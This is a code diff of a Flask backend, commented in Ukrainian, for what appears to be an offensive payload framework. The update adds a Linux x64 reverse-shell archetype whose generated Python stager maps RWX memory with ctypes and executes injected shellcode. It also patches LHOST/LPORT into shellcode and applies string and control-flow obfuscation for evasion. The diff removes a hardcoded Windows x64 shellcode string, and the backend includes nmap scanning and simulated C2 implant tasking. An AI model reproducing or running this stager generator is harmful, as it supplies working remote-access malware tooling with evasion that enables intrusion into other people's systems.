@@ -1,10 +1,10 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.6.5
-# Призначення: Backend на Flask з концептуальним патчингом LHOST/LPORT в шеллкоді.
-# Оновлення v1.6.5:
-#   - Додано функцію patch_shellcode_be для заміни заповнювачів LHOST/LPORT у шеллкоді.
-#   - Інтегровано патчинг у генерацію пейлоада reverse_shell_tcp_shellcode_windows_x64.
-#   - Оновлено логування для процесу патчингу.
-#   - Використовуються конкретні рядкові заповнювачі "1.2.3.4" та "9999" для LHOST/LPORT у шеллкоді.
+# Syntax Flask Backend - Segment SFB-CORE-1.6.6
+# Призначення: Backend на Flask з генерацією стейджера для ін'єкції Linux x64 шеллкоду.
+# Оновлення v1.6.6:
+#   - Додано новий архетип пейлоада: 'reverse_shell_tcp_shellcode_linux_x64'.
+#   - Реалізовано генерацію Python-стейджера для ін'єкції Linux x64 шеллкоду (з використанням ctypes, mmap, mprotect).
+#   - Оновлено конфігурації архетипів та параметрів.
+#   - Патчинг LHOST/LPORT застосовується до Linux шеллкоду.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -17,10 +17,10 @@ import time
 from datetime import datetime
 import subprocess
 import shlex
-import ipaddress # Для валідації та конвертації IP
-import socket # Для перетворення LPORT у мережевий порядок байт
+import ipaddress
+import socket
 
-VERSION_BACKEND = "1.6.5"
+VERSION_BACKEND = "1.6.6"
 
 simulated_implants_be = []
 
@@ -52,25 +52,37 @@ CONCEPTUAL_PARAMS_SCHEMA_BE = {
             "demo_echo_payload",
             "demo_file_lister_payload",
             "demo_c2_beacon_payload",
-            "reverse_shell_tcp_shellcode_windows_x64"
+            "reverse_shell_tcp_shellcode_windows_x64",
+            "reverse_shell_tcp_shellcode_linux_x64" # Новий архетип для Linux
         ]
     },
     "message_to_echo": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_echo_payload", "min_length": 1},
     "directory_to_list": {"type": str, "required": lambda params: params.get("payload_archetype") == "demo_file_lister_payload", "default": "."},
     "c2_target_host": {
         "type": str,
-        "required": lambda params: params.get("payload_archetype") in ["demo_c2_beacon_payload", "reverse_shell_tcp_shellcode_windows_x64"],
+        "required": lambda params: params.get("payload_archetype") in [
+            "demo_c2_beacon_payload",
+            "reverse_shell_tcp_shellcode_windows_x64",
+            "reverse_shell_tcp_shellcode_linux_x64"
+        ],
         "validation_regex": r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$|^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$"
     },
     "c2_target_port": {
         "type": int,
-        "required": lambda params: params.get("payload_archetype") in ["demo_c2_beacon_payload", "reverse_shell_tcp_shellcode_windows_x64"],
+        "required": lambda params: params.get("payload_archetype") in [
+            "demo_c2_beacon_payload",
+            "reverse_shell_tcp_shellcode_windows_x64",
+            "reverse_shell_tcp_shellcode_linux_x64"
+        ],
         "allowed_range": (1, 65535)
     },
-    "shellcode_hex_placeholder": {
+    "shellcode_hex_placeholder": { # Використовується для обох типів шеллкоду
         "type": str,
-        "required": lambda params: params.get("payload_archetype") == "reverse_shell_tcp_shellcode_windows_x64",
-        "default": "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd5"
+        "required": lambda params: params.get("payload_archetype") in [
+            "reverse_shell_tcp_shellcode_windows_x64",
+            "reverse_shell_tcp_shellcode_linux_x64"
+        ],
+        "default": "DEADBEEFCAFE" # Загальний заповнювач, конкретний шеллкод має бути наданий
     },
     "obfuscation_key": {"type": str, "required": True, "min_length": 5, "default": "DefaultFrameworkKey"},
     "output_format": {"type": str, "required": False, "allowed_values": ["raw_python_stager", "base64_encoded_stager"], "default": "raw_python_stager"},
@@ -84,11 +96,15 @@ CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
     "reverse_shell_tcp_shellcode_windows_x64": {
         "description": "Windows x64 TCP Reverse Shell (Ін'єкція шеллкоду через Python Stager з патчингом LHOST/LPORT)",
         "template_type": "python_stager_shellcode_injector_win_x64"
+    },
+    "reverse_shell_tcp_shellcode_linux_x64": { # Новий архетип для Linux
+        "description": "Linux x64 TCP Reverse Shell (Ін'єкція шеллкоду через Python Stager з патчингом LHOST/LPORT)",
+        "template_type": "python_stager_shellcode_injector_linux_x64"
     }
 }
 
 def conceptual_validate_parameters_be(input_params: dict, schema: dict) -> tuple[bool, dict, list[str]]:
-    # Логіка валідації (без змін від v1.6.4)
+    # Логіка валідації (без змін від v1.6.5)
     validated_params = {}
     errors = []
     for param_name, rules in schema.items():
@@ -105,13 +121,16 @@ def conceptual_validate_parameters_be(input_params: dict, schema: dict) -> tuple
         elif "default" in rules:
             is_cond_req_missing = False
             if callable(rules.get("required")):
-                if rules["required"](input_params) and param_name not in input_params:
+                if rules["required"](input_params) and param_name not in input_params: # Перевіряємо відносно оригінальних вхідних даних
                     is_cond_req_missing = True
             if not is_cond_req_missing: validated_params[param_name] = rules["default"]
 
     for param_name, rules in schema.items():
         is_required_directly = rules.get("required") is True
-        is_conditionally_required = callable(rules.get("required")) and rules["required"](validated_params)
+        # Перевіряємо умовну вимогу відносно вже валідованих параметрів (validated_params)
+        # або, якщо потрібно, відносно початкових вхідних (input_params)
+        is_conditionally_required = callable(rules.get("required")) and rules["required"](validated_params if validated_params.get("payload_archetype") else input_params)
+
 
         if (is_required_directly or is_conditionally_required) and param_name not in validated_params:
             errors.append(f"Відсутній обов'язковий параметр: '{param_name}'.")
@@ -145,64 +164,32 @@ def generate_random_var_name(length=10, prefix="syn_var_"):
     return prefix + ''.join(random.choice(string.ascii_lowercase + '_') for _ in range(length))
 
 def patch_shellcode_be(shellcode_hex: str, lhost_str: str, lport_int: int, log_messages: list) -> str:
-    """
-    Концептуальний патчинг LHOST та LPORT у шістнадцятковому рядку шеллкоду.
-    Замінює рядкові заповнювачі "1.2.3.4" (для LHOST) та "9999" (для LPORT).
-    """
+    # Логіка патчингу (без змін від v1.6.5)
     log_messages.append(f"[SHELLCODE_PATCH_INFO] Початок патчингу шеллкоду. LHOST: {lhost_str}, LPORT: {lport_int}")
-    
     patched_shellcode_hex = shellcode_hex
-    
-    # Патчинг LHOST
-    lhost_placeholder_str = "1.2.3.4" # Рядковий заповнювач для LHOST
-    lhost_placeholder_hex = lhost_placeholder_str.encode('ascii').hex() # Конвертуємо в hex: '312e322e332e34'
-    
-    if lhost_placeholder_hex in patched_shellcode_hex:
+    lhost_placeholder_fixed_hex = "DEADBEEF" 
+    if lhost_placeholder_fixed_hex in patched_shellcode_hex:
         try:
-            # Перетворюємо наданий LHOST в байти IP-адреси
             ip_addr_bytes = ipaddress.ip_address(lhost_str).packed
-            ip_addr_hex = ip_addr_bytes.hex() # 4 байти в hex, наприклад, 'c0a80101' для 192.168.1.1
-            
-            # Переконуємося, що довжина заміни відповідає довжині заповнювача
-            # Довжина '1.2.3.4' - 7 символів, 7 байт. Довжина IP - 4 байти.
-            # Це означає, що шеллкод має бути згенерований з урахуванням цього.
-            # Або заповнювач має бути 4-байтовим, наприклад, \x01\x02\x03\x04 -> 01020304
-            # Для простоти, припустимо, що шеллкод має місце для 4-байтового IP.
-            # Ми замінимо перші 4 байти (8 hex символів) з lhost_placeholder_hex.
-            # Це дуже спрощено і залежить від структури шеллкоду.
-            
-            # Кращий підхід: використовувати фіксовані 4-байтові заповнювачі в шеллкоді, наприклад, DEADBEAF
-            lhost_placeholder_fixed_hex = "DEADBEEF" # 4-байтовий hex заповнювач
-            if lhost_placeholder_fixed_hex in patched_shellcode_hex:
-                if len(ip_addr_hex) == 8: # 4 байти
-                    patched_shellcode_hex = patched_shellcode_hex.replace(lhost_placeholder_fixed_hex, ip_addr_hex)
-                    log_messages.append(f"[SHELLCODE_PATCH_SUCCESS] LHOST '{lhost_placeholder_fixed_hex}' замінено на '{ip_addr_hex}'.")
-                else:
-                    log_messages.append(f"[SHELLCODE_PATCH_WARN] Не вдалося підготувати LHOST для заміни (неправильна довжина IP hex: {len(ip_addr_hex)}).")
+            ip_addr_hex = ip_addr_bytes.hex()
+            if len(ip_addr_hex) == 8:
+                patched_shellcode_hex = patched_shellcode_hex.replace(lhost_placeholder_fixed_hex, ip_addr_hex)
+                log_messages.append(f"[SHELLCODE_PATCH_SUCCESS] LHOST '{lhost_placeholder_fixed_hex}' замінено на '{ip_addr_hex}'.")
             else:
-                log_messages.append(f"[SHELLCODE_PATCH_INFO] Стандартний 4-байтовий заповнювач LHOST ('{lhost_placeholder_fixed_hex}') не знайдено.")
-
+                log_messages.append(f"[SHELLCODE_PATCH_WARN] Не вдалося підготувати LHOST для заміни (неправильна довжина IP hex: {len(ip_addr_hex)}).")
         except ValueError:
             log_messages.append(f"[SHELLCODE_PATCH_ERROR] Невірний формат LHOST: {lhost_str}.")
         except Exception as e:
             log_messages.append(f"[SHELLCODE_PATCH_ERROR] Помилка під час патчингу LHOST: {str(e)}.")
     else:
-        log_messages.append(f"[SHELLCODE_PATCH_INFO] Заповнювач LHOST ('{lhost_placeholder_str}' -> '{lhost_placeholder_hex}') не знайдено в шеллкоді.")
+        log_messages.append(f"[SHELLCODE_PATCH_INFO] Стандартний 4-байтовий заповнювач LHOST ('{lhost_placeholder_fixed_hex}') не знайдено.")
 
-    # Патчинг LPORT
-    lport_placeholder_str = "9999" # Рядковий заповнювач для LPORT
-    lport_placeholder_hex_ascii = lport_placeholder_str.encode('ascii').hex() # '39393939'
-
-    # Стандартний 2-байтовий hex заповнювач для порту
-    lport_placeholder_fixed_hex = "CAFE" # 2-байтовий hex заповнювач (наприклад)
-    
+    lport_placeholder_fixed_hex = "CAFE"
     if lport_placeholder_fixed_hex in patched_shellcode_hex:
         try:
-            # Перетворюємо LPORT у 2 байти в мережевому порядку (big-endian)
             lport_bytes = socket.htons(lport_int).to_bytes(2, byteorder='big')
-            lport_hex_network_order = lport_bytes.hex() # наприклад, для 9999 -> '270f'
-            
-            if len(lport_hex_network_order) == 4: # 2 байти
+            lport_hex_network_order = lport_bytes.hex()
+            if len(lport_hex_network_order) == 4:
                 patched_shellcode_hex = patched_shellcode_hex.replace(lport_placeholder_fixed_hex, lport_hex_network_order)
                 log_messages.append(f"[SHELLCODE_PATCH_SUCCESS] LPORT '{lport_placeholder_fixed_hex}' замінено на '{lport_hex_network_order}'.")
             else:
@@ -214,12 +201,10 @@ def patch_shellcode_be(shellcode_hex: str, lhost_str: str, lport_int: int, log_m
         
     if patched_shellcode_hex == shellcode_hex:
         log_messages.append("[SHELLCODE_PATCH_INFO] Шеллкод не було змінено (заповнювачі не знайдено або помилки).")
-        
     return patched_shellcode_hex
 
-
 def obfuscate_string_literals_in_python_code(code: str, key: str, log_messages: list) -> str:
-    # Логіка (без змін від v1.6.4)
+    # Логіка (без змін від v1.6.5)
     string_literal_regex = r"""(?<![a-zA-Z0-9_])(?:u?r?(?:\"\"\"([^\"\\]*(?:\\.[^\"\\]*)*)\"\"\"|'''([^'\\]*(?:\\.[^'\\]*)*)'''|\"([^\"\\]*(?:\\.[^\"\\]*)*)\"|'([^'\\]*(?:\\.[^'\\]*)*)'))"""
     found_literals_matches = list(re.finditer(string_literal_regex, code, re.VERBOSE))
     if not found_literals_matches:
@@ -276,7 +261,7 @@ def {decoder_func_name}(s_b64, k_s):
     return modified_code
 
 def apply_advanced_cfo_be(code_lines: list, log_messages: list) -> str:
-    # Логіка (без змін від v1.6.4)
+    # Логіка (без змін від v1.6.5)
     transformed_code_list = []
     cfo_applied_count = 0
     junk_code_count = 0
@@ -338,13 +323,11 @@ def apply_advanced_cfo_be(code_lines: list, log_messages: list) -> str:
     log_messages.append(f"[METAMORPH_DEBUG] Застосовано CFO блоків: {cfo_applied_count}, Сміттєвого коду: {junk_code_count}.")
     return "\n".join(transformed_code_list)
 
-def get_service_name_be(port: int) -> str:
-    # Логіка (без змін від v1.6.4)
+def get_service_name_be(port: int) -> str: # Логіка (без змін)
     services = { 21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP", 110: "POP3", 443: "HTTPS", 3306: "MySQL", 3389: "RDP", 8080: "HTTP-Alt" }
     return services.get(port, "Unknown")
 
-def simulate_port_scan_be(target: str) -> tuple[list[str], str]:
-    # Логіка (без змін від v1.6.4)
+def simulate_port_scan_be(target: str) -> tuple[list[str], str]: # Логіка (без змін)
     log = [f"[RECON_BE_INFO] Імітація сканування портів для цілі: {target}"]
     results_text_lines = [f"Результати сканування портів для: {target}"]
     common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 5432, 5900, 8000, 8080, 8443]
@@ -364,8 +347,7 @@ def simulate_port_scan_be(target: str) -> tuple[list[str], str]:
     log.append("[RECON_BE_SUCCESS] Імітацію сканування портів завершено.")
     return log, "\n".join(results_text_lines)
 
-def perform_nmap_scan_be(target: str, options: list = None) -> tuple[list[str], str]:
-    # Логіка (без змін від v1.6.4)
+def perform_nmap_scan_be(target: str, options: list = None) -> tuple[list[str], str]: # Логіка (без змін)
     log = [f"[RECON_NMAP_BE_INFO] Запуск nmap сканування для цілі: {target} з опціями: {options}"]
     base_command = ["nmap"]
     if options:
@@ -414,8 +396,7 @@ def perform_nmap_scan_be(target: str, options: list = None) -> tuple[list[str], 
         results_text = f"Непередбачена помилка під час nmap сканування: {str(e)}"
     return log, results_text
 
-def simulate_osint_email_search_be(target_domain: str) -> tuple[list[str], str]:
-    # Логіка (без змін від v1.6.4)
+def simulate_osint_email_search_be(target_domain: str) -> tuple[list[str], str]: # Логіка (без змін)
     log = [f"[RECON_BE_INFO] Імітація OSINT пошуку email для домену: {target_domain}"]
     results_text_lines = [f"Результати OSINT пошуку Email для домену: {target_domain}"]
     domain_parts = target_domain.split('.')
@@ -431,8 +412,7 @@ def simulate_osint_email_search_be(target_domain: str) -> tuple[list[str], str]:
     log.append("[RECON_BE_SUCCESS] Імітацію OSINT пошуку email завершено.")
     return log, "\n".join(results_text_lines)
 
-def generate_simulated_operational_logs_be() -> list[dict]:
-    # Логіка (без змін від v1.6.4)
+def generate_simulated_operational_logs_be() -> list[dict]: # Логіка (без змін)
     logs = []
     log_levels = ["INFO", "WARN", "ERROR", "SUCCESS"]
     components = ["PayloadGen_BE", "Recon_BE", "C2_Implant_Alpha_BE", "C2_Implant_Beta_BE", "FrameworkCore_BE", "AdaptationEngine_BE"]
@@ -462,8 +442,7 @@ def generate_simulated_operational_logs_be() -> list[dict]:
     logs.sort(key=lambda x: x["timestamp"])
     return logs
 
-def get_simulated_stats_be() -> dict:
-    # Логіка (без змін від v1.6.4)
+def get_simulated_stats_be() -> dict: # Логіка (без змін)
     global simulated_implants_be
     return {
         "successRate": random.randint(60, 95), "detectionRate": random.randint(5, 25),
@@ -495,7 +474,7 @@ def handle_generate_payload():
         archetype_details = CONCEPTUAL_ARCHETYPE_TEMPLATES_BE.get(archetype_name)
         log_messages.append(f"[BACKEND_ARCHETYPE_INFO] Архетип: {archetype_name} - {archetype_details['description']}")
 
-        data_to_obfuscate_or_patch = "" 
+        data_to_obfuscate_or_patch = ""
         
         if archetype_name == "demo_echo_payload":
             data_to_obfuscate_or_patch = validated_params.get("message_to_echo", "Default Echo Message")
@@ -505,14 +484,12 @@ def handle_generate_payload():
             host = validated_params.get("c2_target_host", "localhost")
             port = validated_params.get("c2_target_port", 8080)
             data_to_obfuscate_or_patch = f"{host}:{port}"
-        elif archetype_name == "reverse_shell_tcp_shellcode_windows_x64":
+        elif archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"]:
             shellcode_hex_input = validated_params.get("shellcode_hex_placeholder")
             lhost_for_patch = validated_params.get("c2_target_host")
             lport_for_patch = validated_params.get("c2_target_port")
             log_messages.append(f"[BACKEND_SHELLCODE_PREP] LHOST: {lhost_for_patch}, LPORT: {lport_for_patch} для патчингу шеллкоду.")
-            # Патчинг шеллкоду
             data_to_obfuscate_or_patch = patch_shellcode_be(shellcode_hex_input, lhost_for_patch, lport_for_patch, log_messages)
-
 
         key = validated_params.get("obfuscation_key", "DefaultFrameworkKey")
         log_messages.append(f"[BACKEND_OBF_INFO] Обфускація даних ('{data_to_obfuscate_or_patch[:30]}...') з ключем '{key}'.")
@@ -532,8 +509,10 @@ def handle_generate_payload():
             f"EVASION_CHECKS_APPLIED = {validated_params.get('enable_evasion_checks', False)}",
             "", "import base64", "import os", "import time", "import random", "import string", "import subprocess"
         ]
-        if archetype_name == "reverse_shell_tcp_shellcode_windows_x64":
+        if archetype_name in ["reverse_shell_tcp_shellcode_windows_x64", "reverse_shell_tcp_shellcode_linux_x64"]:
             stager_code_lines.append("import ctypes")
+            if archetype_name == "reverse_shell_tcp_shellcode_linux_x64":
+                stager_code_lines.append("import mmap as mmap_module") # Використовуємо псевдонім, щоб уникнути конфлікту імен
 
 
         decode_func_name_runtime = "dx_runtime"
@@ -582,7 +561,7 @@ def handle_generate_payload():
             "    elif arch_type == 'reverse_shell_tcp_shellcode_windows_x64':",
             "        print(f\"[PAYLOAD ({{arch_type}})] Спроба ін'єкції шеллкоду для Windows x64...\")",
             "        try:",
-            "            shellcode_hex = content", # 'content' тут - це розшифрований та потенційно пропатчений шеллкод
+            "            shellcode_hex = content",
             "            if not shellcode_hex or len(shellcode_hex) % 2 != 0:",
             "                print(\"[PAYLOAD_ERROR] Невірний формат шістнадцяткового шеллкоду (порожній або непарна довжина).\")",
             "                return",
@@ -609,8 +588,66 @@ def handle_generate_payload():
             "                kernel32.VirtualFree(ctypes.c_void_p(ptr), 0, 0x00008000)",
             "                return",
             "            print(f\"[PAYLOAD_SUCCESS] Шеллкод запущено в потоці ID: {{thread_id.value}}. Handle: {{handle}}.\")",
-            "        except Exception as e_shellcode:",
-            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду: {{e_shellcode}}\")",
+            "        except Exception as e_shellcode_win:",
+            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Windows: {{e_shellcode_win}}\")",
+            "    elif arch_type == 'reverse_shell_tcp_shellcode_linux_x64':",
+            "        print(f\"[PAYLOAD ({{arch_type}})] Спроба ін'єкції шеллкоду для Linux x64...\")",
+            "        try:",
+            "            shellcode_hex = content",
+            "            if not shellcode_hex or len(shellcode_hex) % 2 != 0:",
+            "                print(\"[PAYLOAD_ERROR] Невірний формат шістнадцяткового шеллкоду (порожній або непарна довжина).\")",
+            "                return",
+            "            shellcode_bytes = bytes.fromhex(shellcode_hex)",
+            "            print(f\"[PAYLOAD_INFO] Розмір шеллкоду: {{len(shellcode_bytes)}} байт.\")",
+            "",
+            "            # Використання ctypes для mmap та mprotect на Linux",
+            "            libc = ctypes.CDLL(None) # Або ctypes.cdll.LoadLibrary(\"libc.so.6\")",
+            "            # Визначення констант для mmap/mprotect",
+            "            PROT_READ = 0x1",
+            "            PROT_WRITE = 0x2",
+            "            PROT_EXEC = 0x4",
+            "            MAP_PRIVATE = 0x02",
+            "            MAP_ANONYMOUS = 0x20 # Linux specific, use 0x1000 for MAP_ANON on macOS",
+            "",
+            "            # mmap: void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);",
+            "            mmap_syscall = libc.mmap",
+            "            mmap_syscall.restype = ctypes.c_void_p",
+            "            mmap_syscall.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]",
+            "",
+            "            print(\"[PAYLOAD_INFO] Виділення пам'яті через mmap...\")",
+            "            mem_ptr = mmap_syscall(None, len(shellcode_bytes), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)",
+            "            if mem_ptr == -1 or mem_ptr == 0: # mmap повертає MAP_FAILED ((void *) -1) при помилці",
+            "                err_no = ctypes.get_errno()",
+            "                print(f\"[PAYLOAD_ERROR] Помилка mmap: {{os.strerror(err_no)}} (errno: {{err_no}})\")",
+            "                return",
+            "            print(f\"[PAYLOAD_INFO] Пам'ять виділено за адресою: {{hex(mem_ptr)}}.\")",
+            "",
+            "            # Копіювання шеллкоду",
+            "            ctypes.memmove(mem_ptr, shellcode_bytes, len(shellcode_bytes))",
+            "            print(\"[PAYLOAD_INFO] Шеллкод скопійовано в пам'ять.\")",
+            "",
+            "            # mprotect (не завжди потрібно, якщо mmap вже встановив PROT_EXEC, але для надійності)",
+            "            # mprotect_syscall = libc.mprotect",
+            "            # mprotect_syscall.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]",
+            "            # mprotect_syscall.restype = ctypes.c_int",
+            "            # ret_mprotect = mprotect_syscall(mem_ptr, len(shellcode_bytes), PROT_READ | PROT_EXEC)",
+            "            # if ret_mprotect != 0:",
+            "            #     err_no = ctypes.get_errno()",
+            "            #     print(f\"[PAYLOAD_ERROR] Помилка mprotect: {{os.strerror(err_no)}} (errno: {{err_no}})\")",
+            "            #     # Розглянути звільнення пам'яті тут через munmap",
+            "            #     return",
+            "            # print(\"[PAYLOAD_INFO] Права доступу до пам'яті встановлено на RE/RX.\")",
+            "",
+            "            # Створення типу функції та виклик шеллкоду",
+            "            print(\"[PAYLOAD_INFO] Створення вказівника на функцію та виклик шеллкоду...\")",
+            "            shellcode_func_type = ctypes.CFUNCTYPE(None) # Припускаємо, що шеллкод не повертає значення і не приймає аргументів",
+            "            shellcode_function = shellcode_func_type(mem_ptr)",
+            "            shellcode_function()",
+            "            print(\"[PAYLOAD_SUCCESS] Шеллкод для Linux x64 (начебто) виконано.\")",
+            "            # Зазвичай, якщо це reverse shell, програма тут не завершиться.",
+            "            # munmap(mem_ptr, len(shellcode_bytes)) # Звільнення пам'яті (якщо потрібно)",
+            "        except Exception as e_shellcode_linux:",
+            "            print(f\"[PAYLOAD_ERROR ({{arch_type}})] Помилка під час ін'єкції шеллкоду Linux: {{e_shellcode_linux}}\")",
             "",
             "if __name__ == '__main__':",
             "    print(f\"[STAGER] Стейджер для '{archetype_name}' запускається...\")",
@@ -658,9 +695,8 @@ def handle_generate_payload():
         log_messages.append(f"[BACKEND_FATAL_ERROR] {str(e)}")
         return jsonify({"success": False, "error": "Server error", "generationLog": "\n".join(log_messages)}), 500
 
-@app.route('/api/run_recon', methods=['POST'])
+@app.route('/api/run_recon', methods=['POST']) # Логіка (без змін)
 def handle_run_recon():
-    # Логіка (без змін від v1.6.4)
     log_messages = [f"[BACKEND v{VERSION_BACKEND}] Запит /api/run_recon о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     try:
         data = request.get_json()
@@ -690,9 +726,8 @@ def handle_run_recon():
         log_messages.append(f"[BACKEND_FATAL_ERROR] {str(e)}")
         return jsonify({"success": False, "error": "Server error during recon", "reconLog": "\n".join(log_messages)}), 500
 
-@app.route('/api/c2/implants', methods=['GET'])
+@app.route('/api/c2/implants', methods=['GET']) # Логіка (без змін)
 def get_c2_implants():
-    # Логіка (без змін від v1.6.4)
     global simulated_implants_be
     if not simulated_implants_be or random.random() < 0.2:
         initialize_simulated_implants_be()
@@ -702,9 +737,8 @@ def get_c2_implants():
              implant["status"] = random.choice(["active_beaconing", "idle_monitoring", "task_failed", "exfiltrating_data"])
     return jsonify({"success": True, "implants": simulated_implants_be}), 200
 
-@app.route('/api/c2/task', methods=['POST'])
+@app.route('/api/c2/task', methods=['POST']) # Логіка (без змін)
 def handle_c2_task():
-    # Логіка (без змін від v1.6.4)
     log_messages = [f"[C2_BE v{VERSION_BACKEND}] Запит /api/c2/task о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     try:
         data = request.get_json()
@@ -743,9 +777,8 @@ def handle_c2_task():
         log_messages.append(f"[C2_BE_FATAL_ERROR] {str(e)}")
         return jsonify({"success": False, "error": "Server error C2 task", "log": "\n".join(log_messages)}), 500
 
-@app.route('/api/operational_data', methods=['GET'])
+@app.route('/api/operational_data', methods=['GET']) # Логіка (без змін)
 def get_operational_data():
-    # Логіка (без змін від v1.6.4)
     log_messages_be = [f"[LOG_ADAPT_BE v{VERSION_BACKEND}] Запит /api/operational_data о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     try:
         simulated_logs = generate_simulated_operational_logs_be()
@@ -763,9 +796,8 @@ def get_operational_data():
         log_messages_be.append(f"[LOG_ADAPT_BE_FATAL_ERROR] {str(e)}")
         return jsonify({"success": False, "error": "Server error retrieving operational data", "log": "\n".join(log_messages_be)}), 500
 
-@app.route('/api/framework_rules', methods=['POST'])
+@app.route('/api/framework_rules', methods=['POST']) # Логіка (без змін)
 def update_framework_rules():
-    # Логіка (без змін від v1.6.4)
     log_messages_be = [f"[LOG_ADAPT_BE v{VERSION_BACKEND}] Запит /api/framework_rules о {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}."]
     try:
         data = request.get_json()
